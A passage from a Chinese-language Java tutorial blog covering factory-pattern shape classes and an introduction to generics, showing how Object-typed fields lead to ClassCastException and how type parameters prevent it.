class="type">double</span> x, <span class="type">double</span> y)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.x = x;</span><br><span class="line">        <span class="built_in">this</span>.y = y;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">getX</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.x;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">getY</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.y;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//绘制三角形</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Triangle</span> <span class="keyword">implements</span> <span class="title class_">IGraphical</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Point[] x;<span class="comment">//第一条边的坐标</span></span><br><span class="line">    <span class="keyword">private</span> Point[] y;<span class="comment">//第二条边的坐标</span></span><br><span class="line">    <span class="keyword">private</span> Point[] z;<span class="comment">//第三条边的坐标</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Triangle</span><span class="params">(Point[] x, Point[] y, Point[] z)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.x = x;</span><br><span class="line">        <span class="built_in">this</span>.y = y;</span><br><span class="line">        <span class="built_in">this</span>.z = z;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">paint</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;绘制第一条边,开始坐标：[&quot;</span> + <span class="built_in">this</span>.x[<span class="number">0</span>].getX() + <span class="string">&quot;,&quot;</span> + <span class="built_in">this</span>.x[<span class="number">1</span>].getY() + <span class="string">&quot;],结束坐标[&quot;</span> + <span class="built_in">this</span>.x[<span class="number">1</span>].getX() + <span class="string">&quot;,&quot;</span> + <span class="built_in">this</span>.x[<span class="number">1</span>].getY() + <span class="string">&quot;]&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;绘制第二条边,开始坐标：[&quot;</span> + <span class="built_in">this</span>.y[<span class="number">0</span>].getX() + <span class="string">&quot;,&quot;</span> + <span class="built_in">this</span>.y[<span class="number">1</span>].getY() + <span class="string">&quot;],结束坐标[&quot;</span> + <span class="built_in">this</span>.y[<span class="number">1</span>].getX() + <span class="string">&quot;,&quot;</span> + <span class="built_in">this</span>.y[<span class="number">1</span>].getY() + <span class="string">&quot;]&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;绘制第三条边,开始坐标：[&quot;</span> + <span class="built_in">this</span>.z[<span class="number">0</span>].getX() + <span class="string">&quot;,&quot;</span> + <span class="built_in">this</span>.z[<span class="number">1</span>].getY() + <span class="string">&quot;],结束坐标[&quot;</span> + <span class="built_in">this</span>.z[<span class="number">1</span>].getX() + <span class="string">&quot;,&quot;</span> + <span class="built_in">this</span>.z[<span class="number">1</span>].getY() + <span class="string">&quot;]&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Circular</span> <span class="keyword">implements</span> <span class="title class_">IGraphical</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> radius;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Circular</span><span class="params">(<span class="type">double</span> radius)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.radius = radius;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">paint</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;以半径为&quot;</span> + <span class="built_in">this</span>.radius + <span class="string">&quot;的圆形&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Factory1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> IGraphical <span class="title function_">getInstance</span><span class="params">(String className, <span class="type">double</span>... args)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;triangle&quot;</span>.equalsIgnoreCase(className)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Triangle</span>(</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">Point</span>[]&#123;</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">Point</span>(args[<span class="number">0</span>], args[<span class="number">1</span>]), <span class="keyword">new</span> <span class="title class_">Point</span>(args[<span class="number">2</span>], args[<span class="number">3</span>])&#125;,</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">Point</span>[]&#123;</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">Point</span>(args[<span class="number">4</span>], args[<span class="number">5</span>]), <span class="keyword">new</span> <span class="title class_">Point</span>(args[<span class="number">6</span>], args[<span class="number">7</span>])&#125;,</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">Point</span>[]&#123;</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">Point</span>(args[<span class="number">8</span>], args[<span class="number">9</span>]), <span class="keyword">new</span> <span class="title class_">Point</span>(args[<span class="number">10</span>], args[<span class="number">11</span>])&#125;</span><br><span class="line">            );</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;circular&quot;</span>.equalsIgnoreCase(className)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Circular</span>(args[<span class="number">0</span>]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test32</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">IGraphical</span> <span class="variable">iga</span> <span class="operator">=</span> Factory1.getInstance(<span class="string">&quot;triangle&quot;</span>,<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>,<span class="number">11.11</span>,<span class="number">22.22</span>,<span class="number">33.33</span>,<span class="number">44.44</span>,<span class="number">111.111</span>,<span class="number">222.222</span>,<span class="number">333.333</span>,<span class="number">444.444</span>);</span><br><span class="line">        iga.paint();</span><br><span class="line">        <span class="type">IGraphical</span> <span class="variable">igb</span> <span class="operator">=</span> Factory1.getInstance(<span class="string">&quot;circular&quot;</span>,<span class="number">88.11</span>);</span><br><span class="line">        igb.paint();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="案例分析三"><a href="#案例分析三" class="headerlink" title="案例分析三"></a>案例分析三</h5><p>​    定义类Shape，用来表示一般二维图形。Shape具有抽象方法area和perimeter，用来计算形状的面积和周长。试定义一些二维形状类（如矩形、三角形、圆形、椭圆形等），这些类均为Shape类的子类。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073552.jpg"                      alt="image-20220705212830053"                ></p><p>​    <img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073553.jpg"                      alt="image-20220705214752926"                ></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">AbstractShape</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="type">double</span> <span class="title function_">area</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="type">double</span> <span class="title function_">perimeter</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Circular1</span> <span class="keyword">extends</span> <span class="title class_">AbstractShape</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> radius;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Circular1</span><span class="params">(<span class="type">double</span> radius)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.radius = radius;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">area</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">3.141592</span> * <span class="built_in">this</span>.radius * <span class="built_in">this</span>.radius;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">perimeter</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span> * <span class="number">3.1415926</span> * <span class="built_in">this</span>.radius;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Rectangle</span> <span class="keyword">extends</span> <span class="title class_">AbstractShape</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> length;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> width;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Rectangle</span><span class="params">(<span class="type">double</span> length, <span class="type">double</span> width)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.length = length;</span><br><span class="line">        <span class="built_in">this</span>.width = width;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">area</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.length * <span class="built_in">this</span>.width;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">perimeter</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span> * (<span class="built_in">this</span>.width + <span class="built_in">this</span>.length);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Factory</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> AbstractShape <span class="title function_">getInstance</span><span class="params">(String className,<span class="type">double</span> ... args)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;Circular&quot;</span>.equalsIgnoreCase(className))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Circular1</span>(args[<span class="number">0</span>]);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;Rectangle&quot;</span>.equalsIgnoreCase(className))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Rectangle</span>(args[<span class="number">0</span>],args[<span class="number">1</span>]);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test33</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">AbstractShape</span> <span class="variable">asa</span> <span class="operator">=</span> Factory.getInstance(<span class="string">&quot;Circular&quot;</span>,<span class="number">1.1</span>);</span><br><span class="line">        <span class="type">AbstractShape</span> <span class="variable">asb</span> <span class="operator">=</span> Factory.getInstance(<span class="string">&quot;Rectangle&quot;</span>,<span class="number">1.5</span>,<span class="number">10.2</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;圆形面积：&quot;</span>+asa.area()+<span class="string">&quot;圆形周长：&quot;</span>+asa.perimeter());</span><br><span class="line">        System.out.println(<span class="string">&quot;矩形面积：&quot;</span>+asb.area()+<span class="string">&quot;矩形周长：&quot;</span>+asb.perimeter());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h4 id="泛型"><a href="#泛型" class="headerlink" title="泛型"></a>泛型</h4><p>​    泛型是从JDK1.5之后追加到Java语言里面的，其主要目的是为了解决ClassCastExcation的问题，在进行对象的向下转型时永远可能存在安全隐患，而Java希望通过泛型可以慢慢解决掉此类问题。</p><h5 id="泛型问题引出"><a href="#泛型问题引出" class="headerlink" title="泛型问题引出"></a>泛型问题引出</h5><p>​    现在假设说定义一个描述x与y坐标的处理类，并且在这个类之中允许开发者保存有三类数据。1、整型数据：x=10、y=20；2、浮点型数据：x=10.1、y=20.9；3、字符串型数据：x=东经120度、北纬30度。</p><p>​    于是在设计Point类的时候就需要去考虑具体的x和y属性的类型，这个类型要求可以保存以上三种数据。</p><p>​    很明显，最为原始的做法使用Object类来进行定义，因为存在有如下的转型关系：</p><p>​    1、整型数据：基本数据类型 –&gt; 包装为Integer类对象 –&gt; 自动向上转型为Object</p><p>​    2、浮点型数据：基本数据类型 –&gt; 包装为Double类对象 –&gt; 自动向上转型为Object</p><p>​    3、字符串数据：String类对象 –&gt; 自动向上转型为Object；</p><p>范例：</p><p>​    定义Point类如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Point1</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Object x;</span><br><span class="line">    <span class="keyword">private</span> Object y;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setX</span><span class="params">(Object x)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.x = x;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setY</span><span class="params">(Object y)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.y = y;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getX</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.x;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getY</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.y;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    而后进行内容的设置</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Point1</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Object x;</span><br><span class="line">    <span class="keyword">private</span> Object y;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setX</span><span class="params">(Object x)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.x = x;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setY</span><span class="params">(Object y)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.y = y;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getX</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.x;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getY</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.y;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test34</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Point1</span> <span class="variable">point</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Point1</span>();</span><br><span class="line">        <span class="comment">//第一步：根据需求进行内容的设置</span></span><br><span class="line">        point.setX(<span class="number">10</span>);<span class="comment">//自动装箱</span></span><br><span class="line">        point.setY(<span class="number">20</span>);<span class="comment">//自动装箱</span></span><br><span class="line">        <span class="comment">//第二步：从里面获取数据</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> (Integer) point.getX();</span><br><span class="line">        <span class="type">int</span> <span class="variable">y</span> <span class="operator">=</span> (Integer) point.getY();</span><br><span class="line">        System.out.println(<span class="string">&quot;x坐标：&quot;</span> + x + <span class="string">&quot;;&quot;</span> + <span class="string">&quot;、y坐标:&quot;</span> + y);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    <strong>本程序之所以可以解决当前的设计问题，主要的原因在于，Object可以接收所有的数据类型，但是正因为如此，所以本代码也会拥有严重的错误。下面是一个错误示范</strong>！！！！</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test34</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Point1</span> <span class="variable">point</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Point1</span>();</span><br><span class="line">        <span class="comment">//第一步：根据需求进行内容的设置</span></span><br><span class="line">        point.setX(<span class="number">10</span>);<span class="comment">//自动装箱</span></span><br><span class="line">        point.setY(<span class="string">&quot;北纬20度&quot;</span>);!!!!!!!!!!!</span><br><span class="line">        <span class="comment">//第二步：从里面获取数据</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> (Integer) point.getX();</span><br><span class="line">        <span class="type">int</span> <span class="variable">y</span> <span class="operator">=</span> (Integer) point.getY();</span><br><span class="line">        System.out.println(<span class="string">&quot;x坐标：&quot;</span> + x + <span class="string">&quot;;&quot;</span> + <span class="string">&quot;、y坐标:&quot;</span> + y);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    上面这段代码，如果在程序编译的时候实际上是不会有任何的错误产生的，而程序的执行的时候会出现java.lang.ClassCastException:异常类型错误，所以本程序的设计是存在安全隐患的。安全隐患的原因是使用了Object类型，因为Object可以涵盖的范围太广，而对于这样的错误如果可以出现在编译的阶段，那么可以极大程度的缓解运行时的尴尬。所以就出现了泛型。</p><h5 id="泛型基本定义"><a href="#泛型基本定义" class="headerlink" title="泛型基本定义"></a>泛型基本定义</h5><p>​    如果要想避免项目之中出现“ClassCastException”最好的做法是可以直接回避掉对象的强制转换，所以在JDK1.5之后提供泛型技术，<strong>而泛型的本质在于，类中的属性或方法的参数与返回值的类型可以由对象实例化的时候动态确定</strong>。</p><p>​    那么此时就需要再类定义的时候明确的定义占位符（泛型标记）。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//T是Type的简写，可以定义多个泛型</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Point1</span>&lt;T&gt; &#123;</span><br><span class="line">    <span class="keyword">private</span> T x;</span><br><span class="line">    <span class="keyword">private</span> T y;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setX</span><span class="params">(T x)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.x = x;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setY</span><span class="params">(T y)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.y = y;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> T <span class="title function_">getX</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.x;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> T <span class="title function_">getY</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.y;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    此时Point类中的x与y属性的数据类型并不确定，而是由外部来决定。</p><p>提示：关于默认的泛型模型。由于泛型是属于JDK1.5之后的产物，但是在这之前已经有不少内置的程序类或者是接口广泛的应用在了开发之中。于是为了保证这些类或者接口设置了泛型之后，原始的程序类依然可以使用，所以如果不设置泛型类型时，自动将使用Object作为类型，以保证程序的正常执行。但是编译会出现警告信息。</p><p>​    泛型定义完成后可以在实例化对象的时候进行泛型类型的设置，一旦设置之后，里面的x与y的属性类型就与当前对象直接绑定了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//T是Type的简写，可以定义多个泛型</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Point1</span>&lt;T&gt; &#123;</span><br><span class="line">    <span class="keyword">private</span> T x;</span><br><span class="line">    <span class="keyword">private</span> T y;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setX</span><span class="params">(T x)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.x = x;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setY</span><span class="params">(T y)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.y = y;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> T <span class="title function_">getX</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.x;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> T <span class="title function_">getY</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.y;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test34</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Point1&lt;Integer&gt; point = <span class="keyword">new</span> <span class="title class_">Point1</span>&lt;Integer&gt;();</span><br><span class="line">      Point1&lt;String&gt; pointB = <span class="keyword">new</span> <span class="title class_">Point1</span>&lt;String&gt;();<span class="comment">//第二个对象</span></span><br><span class="line">        <span class="comment">//第一步：根据需求进行内容的设置</span></span><br><span class="line">        point.setX(<span class="number">10</span>);<span class="comment">//自动装箱</span></span><br><span class="line">        point.setY(<span class="number">20</span>);<span class="comment">//自动装箱</span></span><br><span class="line">        <span class="comment">//第二步：从里面获取数据</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> point.getX();</span><br><span class="line">        <span class="type">int</span> <span class="variable">y</span> <span class="operator">=</span> point.getY();</span><br><span class="line">        System.out.println(<span class="string">&quot;x坐标：&quot;</span> + x + <span class="string">&quot;;&quot;</span> + <span class="string">&quot;、y坐标:&quot;</span> + y);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    现在的程序代码之中，由于Point类里面设置的泛型类型为Integer，这样所有的对应此泛型的属性、变量、方法返回值就将全部替换为Interger（只限于此对象之中），从而在上面的代码中也就避免了向下转型。这样我们在处理的时候如果发现设置的内容有错误，则会在编译的时候有错误提示，同时也避免了对象的向下转型处理（避免安全隐患）。</p><p>​    泛型使用的注意点：</p><p>​    1、泛型之中只允许设置引用类型，如果现在要操作基本类型必须使用包装类。</p><p>​    2、从JDK1.7开始，泛型对象实例化可以简化为“Point<Inter> point = new Point&lt;&gt;()”;后面可以省略</p><p>​    使用泛型可以解决大部分的类对象的强制转换处理，这样的程序才是一个合理的设计。</p><h5 id="泛型通配符"><a href="#泛型通配符" class="headerlink" title="泛型通配符"></a>泛型通配符</h5><p>​    虽然泛型帮助开发者解决了一系列的对象的强制转换所带来的安全隐患，但是从另一个角度来看，泛型带来了一个新的问题，那就是引用传递处理。</p><p>范例：问题产生</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> two;</span><br><span class="line"></span><br><span 